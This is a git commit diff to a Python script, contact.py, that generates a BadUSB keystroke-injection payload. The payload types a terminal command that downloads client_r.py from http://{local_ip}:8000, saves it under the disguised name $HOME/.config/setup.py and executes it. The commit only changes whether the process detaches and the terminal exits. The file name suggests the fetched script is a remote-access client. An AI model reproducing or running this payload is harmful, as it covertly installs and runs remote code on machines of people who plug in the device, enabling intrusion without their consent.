0712adc5ad6db09f1370a58cd5b7a1740acd9534
Oscar Deschamps <oscardeschamps@Mac.lan>
2025-06-25 18:11:38 +0200

    align

--- contact.py
+++ contact.py
@@ -41,9 +41,11 @@ STRING terminal
 DELAY 300
 ENTER
 DELAY 1000
-STRING (wget http://{local_ip}:8000/client_r.py -O $HOME/.config/setup.py && python3 $HOME/.config/setup.py) & disown; exit
+STRING (wget http://{local_ip}:8000/client_r.py -O $HOME/.config/setup.py && python3 $HOME/.config/setup.py)
 ENTER
 """
+
+#& disown; exit
 
 print(badusb_payload)
 # take first argument as the USB mount path
